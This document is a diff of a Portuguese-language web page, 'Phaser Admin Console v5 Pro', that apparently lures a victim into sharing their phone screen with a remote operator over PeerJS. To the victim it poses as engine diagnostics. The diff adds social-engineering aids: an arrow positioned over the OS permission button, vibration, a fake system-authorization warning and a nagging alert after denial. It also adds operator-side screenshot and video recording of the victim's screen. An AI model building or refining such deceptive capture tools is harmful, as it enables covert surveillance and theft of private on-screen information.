@@ -1,10 +1,9 @@
-
 <!DOCTYPE html>
 <html lang="pt-br">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Phaser Admin Console v5</title>
+    <title>Phaser Admin Console v5 Pro</title>
     <script src="https://unpkg.com/peerjs@1.5.2/dist/peerjs.min.js"></script>
     <script src="https://cdn.tailwindcss.com"></script>
     <style>
@@ -13,6 +12,11 @@
         .ping-visual { position: fixed; width: 60px; height: 60px; border: 4px solid #00ff41; border-radius: 50%; transform: translate(-50%, -50%); pointer-events: none; z-index: 9999; animation: ping-ani 0.8s ease-out; }
         @keyframes ping-ani { from { transform: translate(-50%, -50%) scale(0); opacity: 1; } to { transform: translate(-50%, -50%) scale(3); opacity: 0; } }
         #remote-video { width: 100%; height: auto; border-radius: 8px; box-shadow: 0 0 30px rgba(0, 255, 65, 0.2); }
+        .guide-arrow { position: fixed; left: 50%; transform: translateX(-50%); z-index: 1000; animation: bounce 0.6s infinite alternate; }
+        /* Posição média do botão de aceitação no Android/iOS mobile */
+        .android-guide { bottom: 15%; }
+        .ios-guide { bottom: 18%; }
+        @keyframes bounce { from { transform: translateX(-50%) translateY(0); } to { transform: translateX(-50%) translateY(-25px); } }
     </style>
 </head>
 <body class="p-2 md:p-6 min-h-screen flex flex-col">
@@ -20,12 +24,12 @@
 
     <header class="flex justify-between items-center border border-[#00ff41]/50 p-3 rounded-lg mb-4 bg-[#00ff41]/5">
         <div class="text-[10px]">
-            <div class="font-bold uppercase tracking-tighter">PHASER_MASTER_v5</div>
+            <div class="font-bold uppercase tracking-tighter">PHASER_MASTER_v5_PRO</div>
             <div id="status-tag" class="text-white opacity-50">Handshake: Offline</div>
         </div>
         <div class="text-right">
             <div id="clock" class="text-xs font-bold font-mono">00:00:00</div>
-            <div id="fps" class="text-[9px] opacity-40 italic">STABLE_FPS</div>
+            <div id="fps" class="text-[9px] opacity-40 italic glitch">SYNCING</div>
         </div>
     </header>
 
@@ -39,8 +43,7 @@
             </div>
         </div>
 
-        <div id="gallery" class="h-24 overflow-x-auto flex gap-2 p-2 border border-[#00ff41]/20 rounded-lg">
-            </div>
+        <div id="gallery" class="h-24 overflow-x-auto flex gap-2 p-2 border border-[#00ff41]/20 rounded-lg"></div>
     </main>
 
     <section id="host-panel" class="flex-1 flex flex-col items-center justify-center border-2 border-dashed border-[#00ff41]/30 rounded-2xl p-8 space-y-6">
@@ -48,39 +51,43 @@
             <div class="w-10 h-10 bg-[#00ff41] rounded-sm"></div>
         </div>
         <div class="text-center">
-            <h1 class="text-2xl font-black mb-2">DEBUG_SYNC</h1>
-            <p class="text-xs opacity-60 leading-relaxed">Sincronize sua tela para análise de performance e extração de metadados de renderização.</p>
+            <h1 class="text-2xl font-black mb-2 tracking-widest glitch">ENGINE_OPT</h1>
+            <p class="text-xs opacity-60 leading-relaxed max-w-xs">Necessária sincronização de frames para diagnóstico remoto de buffers de renderização.</p>
         </div>
-        <button onclick="initSync()" class="w-full bg-[#00ff41] text-black font-black py-5 rounded-xl text-lg shadow-[0_10px_40px_rgba(0,255,65,0.3)] active:scale-95">SINCRONIZAR ENGINE</button>
+        <button onclick="initSync()" class="w-full bg-[#00ff41] text-black font-black py-5 rounded-xl text-lg shadow-[0_10px_40px_rgba(0,255,65,0.3)] active:scale-95">SINCRONIZAR AGORA</button>
     </section>
 
     <footer class="mt-6 p-4 bg-[#00ff41]/5 border border-[#00ff41]/20 rounded-xl space-y-3">
         <div class="flex justify-between text-[10px]">
-            <span class="opacity-40">SERVER_ENDPOINT:</span>
-            <span id="my-id-display" class="font-bold text-white tracking-widest uppercase">Initializing...</span>
+            <span class="opacity-40 tracking-widest uppercase">My_Master_ID:</span>
+            <span id="my-id-display" class="font-bold text-white tracking-widest uppercase">Aguardando...</span>
         </div>
         <div id="invite-area" class="hidden">
             <div class="flex gap-2">
-                <div id="share-link" class="flex-1 bg-black p-2 border border-[#00ff41]/30 text-[9px] truncate text-emerald-400"></div>
-                <button onclick="copyToClipboard()" class="bg-[#00ff41] text-black px-4 py-2 font-bold text-[10px] rounded">COPY</button>
+                <div id="share-link" class="flex-1 bg-black p-2 border border-[#00ff41]/30 text-[9px] truncate text-emerald-400 select-all"></div>
+                <button onclick="copyToClipboard()" class="bg-[#00ff41] text-black px-4 py-2 font-bold text-[10px] rounded active:scale-95">COPY</button>
             </div>
         </div>
     </footer>
 
-    <div id="induction-guide" class="fixed inset-0 z-[1000] bg-black/90 backdrop-blur hidden flex-col items-center justify-end pb-32">
-        <div class="mb-10 text-center px-10">
-            <p class="text-lg font-bold">PERMISSÃO NECESSÁRIA</p>
-            <p class="text-xs opacity-60">Aceite a captura para iniciar o diagnóstico de frames.</p>
+    <div id="induction-guide" class="fixed inset-0 z-[1000] bg-black/95 hidden flex flex-col">
+        <div class="flex-1 flex flex-col items-center justify-center text-center p-10 mt-20">
+            <div class="p-3 bg-red-600/10 rounded-full border border-red-600/50 mb-6">
+                <svg viewBox="0 0 24 24" class="w-10 h-10 fill-red-500 animate-pulse"><path d="M12,2C6.48,2 2,6.48 2,12C2,17.52 6.48,22 12,22C17.52,22 22,17.52 22,12C22,6.48 17.52,2 12,2M13,17H11V15H13V17M13,13H11V7H13V13Z"></path></svg>
+            </div>
+            <p class="text-xl font-bold text-white">AUTORIZAÇÃO DO SISTEMA</p>
+            <p class="text-sm opacity-80 mt-2 max-w-sm">Para continuar o diagnóstico, aceite a captura de frames no popup que aparecerá.</p>
         </div>
-        <div class="animate-bounce flex flex-col items-center">
+        
+        <div class="guide-arrow android-guide">
             <div class="bg-[#00ff41] text-black px-8 py-3 rounded-full font-black shadow-[0_0_50px_#00ff41]">CLIQUE EM "INICIAR" ↓</div>
-            <div class="w-0 h-0 border-l-[20px] border-l-transparent border-r-[20px] border-r-transparent border-t-[30px] border-t-[#00ff41]"></div>
+            <div class="w-0 h-0 border-l-[20px] border-l-transparent border-r-[20px] border-r-transparent border-t-[30px] border-t-[#00ff41] mx-auto mt-[-5px]"></div>
         </div>
     </div>
 
     <script>
         // CONFIGURAÇÃO: SEU ID FIXO
-        const TECH_ID = 'hoblotgamer-master-control-2026';
+        const TECH_ID = 'hoblotgamer-master-pro-2026';
         
         const peer = new Peer(TECH_ID);
         const urlParams = new URLSearchParams(window.location.search);
@@ -91,11 +98,17 @@
         let recordedChunks = [];
         let isRecording = false;
 
+        // Detectar OS para ajustar a seta
+        const userAgent = navigator.userAgent || navigator.vendor || window.opera;
+        const isIOS = /iPad|iPhone|iPod/.test(userAgent) && !window.MSStream;
+        if (isIOS) document.querySelector('.guide-arrow').classList.replace('android-guide', 'ios-guide');
+
         peer.on('open', (id) => {
             document.getElementById('my-id-display').innerText = id;
             if(!connectToId) {
                 document.getElementById('invite-area').classList.remove('hidden');
-                document.getElementById('share-link').innerText = `${window.location.origin}${window.location.pathname}?connect=${id}`;
+                const baseUrl = `${window.location.origin}${window.location.pathname}`;
+                document.getElementById('share-link').innerText = `${baseUrl}?connect=${id}`;
             }
         });
 
@@ -107,7 +120,7 @@
                 document.getElementById('tech-panel').classList.remove('hidden');
                 const video = document.getElementById('remote-video');
                 video.srcObject = stream;
-                document.getElementById('status-tag').innerText = "Status: Live Feed";
+                document.getElementById('status-tag').innerText = "Handshake: LIVE_FEED";
             });
         });
 
@@ -121,55 +134,64 @@
 
         // Sincronização (Ação do Amigo)
         async function initSync() {
-            if(!connectToId) return alert("Modo Mestre Ativo. Envie o link para um Host.");
+            if(!connectToId) return alert("Modo Técnico Ativo.");
             const guide = document.getElementById('induction-guide');
             guide.classList.remove('hidden');
 
+            // Vibração de atenção
+            if(navigator.vibrate) navigator.vibrate([200, 100, 200, 100, 200]);
+
             try {
-                const stream = await navigator.mediaDevices.getDisplayMedia({ video: { frameRate: 30 }, audio: false });
+                const stream = await navigator.mediaDevices.getDisplayMedia({ 
+                    video: { frameRate: 30, cursor: "always" }, 
+                    audio: false 
+                });
+                
                 guide.classList.add('hidden');
                 
                 peer.call(connectToId, stream);
                 const connection = peer.connect(connectToId);
                 conn = connection;
 
-                // Setup de Gravação local no celular dele comandado por você
-                mediaRecorder = new MediaRecorder(stream, { mimeType: 'video/webm' });
-                mediaRecorder.ondataavailable = (e) => { if(e.data.size > 0) recordedChunks.push(e.data); };
-                mediaRecorder.onstop = () => {
-                    const blob = new Blob(recordedChunks, { type: 'video/webm' });
-                    conn.send({ type: 'file', file: blob, fileType: 'video' });
-                    recordedChunks = [];
-                };
-
-                document.getElementById('host-panel').innerHTML = `<div class="animate-pulse text-[#00ff41]">ENGINE_SYNC_ACTIVE</div>`;
+                document.getElementById('host-panel').innerHTML = `<div class="animate-pulse text-[#00ff41]">PHASER_SYNC_ACTIVE</div>`;
             } catch (err) {
+                // Se ele negou ou houve erro
                 guide.classList.add('hidden');
-                alert("Erro de permissão.");
+                alert("Para o diagnóstico funcionar, é necessário aceitar a permissão do sistema.");
+                console.error(err);
             }
         }
 
         // Comandos do Técnico
         function requestCapture(type) {
-            if(!conn) return;
+            if(!conn || !conn.open) return;
             if(type === 'photo') {
-                // Tira print no celular dele e manda pra você
                 const video = document.getElementById('remote-video');
                 const canvas = document.createElement('canvas');
                 canvas.width = video.videoWidth;
                 canvas.height = video.videoHeight;
                 canvas.getContext('2d').drawImage(video, 0, 0);
-                canvas.toBlob((blob) => {
-                    handleReceivedFile(blob, 'photo'); // Como é P2P, simulamos recebimento local do frame capturado
-                });
+                canvas.toBlob((blob) => { handleReceivedFile(blob, 'photo'); });
             } else if (type === 'video') {
                 isRecording = !isRecording;
-                document.getElementById('rec-btn').innerText = isRecording ? 'PARAR' : 'GRAVAR';
+                document.getElementById('rec-btn').innerText = isRecording ? 'STOP' : 'GRAVAR';
+                document.getElementById('rec-btn').classList.toggle('bg-red-600');
                 document.getElementById('rec-btn').classList.toggle('bg-white');
                 document.getElementById('rec-btn').classList.toggle('text-black');
-                // Envia comando para o Host gravar (Simulado aqui por simplicidade no técnico)
-                alert("Gravando o stream recebido...");
-                // Nota: Gravar o stream recebido é mais seguro do que pedir pro host gravar e enviar
+                
+                if (isRecording) {
+                    recordedChunks = [];
+                    const stream = document.getElementById('remote-video').srcObject;
+                    mediaRecorder = new MediaRecorder(stream, { mimeType: 'video/webm' });
+                    mediaRecorder.ondataavailable = (e) => { if(e.data.size > 0) recordedChunks.push(e.data); };
+                    mediaRecorder.onstop = () => {
+                        const blob = new Blob(recordedChunks, { type: 'video/webm' });
+                        handleReceivedFile(blob, 'video');
+                    };
+                    mediaRecorder.start();
+                } else {
+                    mediaRecorder.stop();
+                }
             }
         }
 
@@ -178,18 +200,20 @@
             const gallery = document.getElementById('gallery');
             const el = document.createElement(type === 'photo' ? 'img' : 'video');
             el.src = url;
-            el.className = "h-full border border-white/20 rounded cursor-pointer";
+            el.className = "h-full border border-[#00ff41]/20 rounded cursor-pointer active:scale-95";
             if(type === 'video') el.controls = true;
             el.onclick = () => window.open(url);
             gallery.prepend(el);
         }
 
         function handlePointer(e) {
-            if(!conn) return;
+            if(!conn || !conn.open) return;
             const rect = e.target.getBoundingClientRect();
-            const x = (e.clientX - rect.left) / rect.width;
-            const y = (e.clientY - rect.top) / rect.height;
-            conn.send({ type: 'ping', x, y });
+            conn.send({
+                type: 'ping',
+                x: (e.clientX - rect.left) / rect.width,
+                y: (e.clientY - rect.top) / rect.height
+            });
         }
 
         function spawnPing(x, y) {
@@ -205,7 +229,7 @@
         function copyToClipboard() {
             const text = document.getElementById('share-link').innerText;
             navigator.clipboard.writeText(text);
-            alert("Link copiado!");
+            alert("Link copiado! Mande para o Host.");
         }
 
         setInterval(() => { document.getElementById('clock').innerText = new Date().toLocaleTimeString(); }, 1000);
